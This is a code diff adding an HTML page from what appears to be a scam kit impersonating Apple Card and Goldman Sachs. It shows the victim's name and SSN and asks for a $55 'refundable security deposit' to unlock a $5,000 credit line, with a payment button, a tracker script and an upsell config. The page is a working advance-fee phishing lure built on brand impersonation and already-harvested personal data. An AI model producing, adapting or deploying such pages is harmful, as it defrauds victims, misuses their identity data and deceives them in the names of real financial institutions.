@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="../../tracker.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Deposit — Apple Card</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../upsell.css">
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+  <img class="loading-logo" src="../../assets/images/black.svg" alt="">
+  <div class="loading-spinner"></div>
+  <div class="loading-msg">Calculating security deposit...</div>
+</div>
+
+<div class="page" id="mainPage" style="display:none">
+  <nav class="nav">
+    <div class="nav-spacer"></div>
+    <div class="nav-title">Security Deposit</div>
+    <div class="nav-step">6/6</div>
+  </nav>
+
+  <div class="content">
+    <div class="hero fade-up">
+      <div class="hero-icon">
+        <svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
+      </div>
+      <h1>Refundable<br>security deposit</h1>
+      <p>For credit lines above $4,500, Goldman Sachs requests a symbolic security deposit. The amount is refunded in full after 90 days of regular use.</p>
+    </div>
+
+    <div class="detail-card fade-up">
+      <div class="dc-row">
+        <span class="label">Holder</span>
+        <span class="value" id="customerName">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">SSN</span>
+        <span class="value" id="customerNif">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Credit line</span>
+        <span class="value">$5,000</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Deposit required</span>
+        <span class="value">$55.00 (1.1%)</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Refund</span>
+        <span class="value success">90 business days</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Refund method</span>
+        <span class="value success">Auto-credit to your account</span>
+      </div>
+    </div>
+
+    <div class="reasons fade-up">
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <div class="reason-text"><strong>100% refundable</strong>After 90 days, the amount is returned as an automatic credit — no requests, no paperwork.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/><path d="M19 7H5V5h14v2zm0 12H5v-2h14v2z"/></svg></div>
+        <div class="reason-text"><strong>Builds credit history</strong>Speeds up limit review — customers with active deposit see their limit reviewed after 30 days.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
+        <div class="reason-text"><strong>Reassures the issuing bank</strong>Reduces credit risk and unlocks delivery of the physical titanium card.</div>
+      </div>
+    </div>
+
+    <div class="price-block fade-up">
+      <span class="price-tag">Refundable in 90 days</span>
+      <div class="price-value" data-price-display>$55.00</div>
+      <div class="price-desc">Security deposit · Automatic refund · No fees</div>
+    </div>
+
+    <button class="pay-btn" id="payBtn">
+      <span class="pay-btn-label">Deposit · <span data-price-display>$55.00</span></span>
+    </button>
+
+    <div class="trust-line">
+      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+      Secure payment · Card · PayPal · Bank
+    </div>
+
+    <button class="skip-link" id="skipBtn">Continue to dashboard</button>
+  </div>
+</div>
+
+<script>
+window.UPSELL_CONFIG = {
+  id: 'upsell-caucao-us',
+  title: 'Security Deposit',
+  price: 55.00,
+  next: '../../dashboard.html'
+};
+</script>
+<script src="../upsell.js"></script>
+</body>
+</html>
